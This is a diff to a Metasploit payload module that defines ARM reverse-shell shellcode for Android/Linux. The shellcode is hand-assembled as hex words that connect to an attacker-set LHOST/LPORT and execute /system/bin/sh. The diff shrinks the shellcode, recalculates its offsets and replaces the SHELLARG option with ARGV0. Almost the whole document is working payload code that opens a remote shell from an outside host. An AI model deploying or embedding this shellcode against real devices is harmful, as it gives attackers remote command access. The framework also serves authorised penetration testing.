@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -28,8 +28,8 @@ module Metasploit3
         {
           'Offsets' =>
             {
-              'LHOST'    => [ 172, 'ADDR' ],
-              'LPORT'    => [ 170, 'n' ],
+              'LHOST'    => [ 136, 'ADDR' ],
+              'LPORT'    => [ 134, 'n' ],
             },
           'Payload' =>
             [
@@ -54,7 +54,7 @@ module Metasploit3
 
               # connect(soc, socaddr, 0x10)
               0xe1a06000,       # mov     r6, r0
-              0xe28f1084,       # 1dr     r1, pc, #132  ; 0x84
+              0xe28f1060,       # 1dr     r1, pc, #96  ; 0x60
               0xe3a02010,       # mov     r2, #16 ; 0x10
               0xe3a0708d,       # mov     r7, #141        ; 0x8d
               0xe287708e,       # add     r7, r7, #142    ; 0x8e
@@ -79,30 +79,18 @@ module Metasploit3
               0xef000000,       # svc     0x00000000
 
               # execve("/system/bin/sh", args, env)
-              # Shrink me here. I am lame.
-              0xe28f0048,       # add     r0, pc, #72     ; 0x48
+              0xe28f0024,       # add     r0, pc, #36     ; 0x24
               0xe0244004,       # eor     r4, r4, r4
               0xe92d0010,       # push    {r4}
               0xe1a0200d,       # mov     r2, sp
-              0xe92d0004,       # push    {r2}
-              0xe1a0200d,       # mov     r2, sp
+              0xe28f4024,       # add     r4, pc, #36     ; 0x10
               0xe92d0010,       # push    {r4}
-              0xe59f1048,       # ldr     r1, [pc, #72]   ; 8124 <env+0x8>
-              0xe92d0002,       # push    {r1}
-              0xe92d2000,       # push    {sp}
               0xe1a0100d,       # mov     r1, sp
-              0xe92d0004,       # push    {r2}
-              0xe1a0200d,       # mov     r2, sp
               0xe3a0700b,       # mov     r7, #11 ; 0xb
               0xef000000,       # svc     0x00000000
 
-              # exit(0)
-              0xe3a00000,       # mov     r0, #0  ; 0x0
-              0xe3a07001,       # mov     r7, #1  ; 0x1
-              0xef000000,       # svc     0x00000000
-
               # <af>:
-              # port offset = 170, ip offset = 172
+              # port offset = 134, ip offset = 136
               0x04290002,       # .word   0x5c110002 @ port: 4444 , sin_fam = 2
               0x0101a8c0,       # .word   0x0101a8c0 @ ip: 192.168.1.1
               # <shell>:
@@ -111,7 +99,10 @@ module Metasploit3
               0x00000000,       # .word   0x00000000
               0x00000000,       # .word   0x00000000
               # <arg>:
-              0x00000000        # .word   0x00000000 ; the args!
+              0x00000000,       # .word   0x00000000 ; the args!
+              0x00000000,       # .word   0x00000000
+              0x00000000,       # .word   0x00000000
+              0x00000000,       # .word   0x00000000
 
             ].pack("V*")
         }
@@ -121,7 +112,7 @@ module Metasploit3
     register_options(
       [
         OptString.new('SHELL', [ true, "The shell to execute.", "/system/bin/sh" ]),
-        OptString.new('SHELLARG', [ false, "The argument to pass to the shell.", "-C" ])
+        OptString.new('ARGV0', [ false, "argv[0] to pass to execve", "sh" ]) # mostly used for busybox
       ], self.class)
   end
 
@@ -132,14 +123,14 @@ module Metasploit3
     if sh.length >= 16
       raise ArgumentError, "The specified shell must be less than 16 bytes."
     end
-    p[176, sh.length] = sh
+    p[140, sh.length] = sh
 
-    arg = datastore['SHELLARG']
+    arg = datastore['ARGV0']
     if arg
-      if arg.length >= 4
-        raise ArgumentError, "The specified shell argument must be less than 4 bytes."
+      if arg.length >= 16
+        raise ArgumentError, "The specified argv[0] must be less than 16 bytes."
       end
-      p[192, arg.length] = arg
+      p[156, arg.length] = arg
     end
 
     p
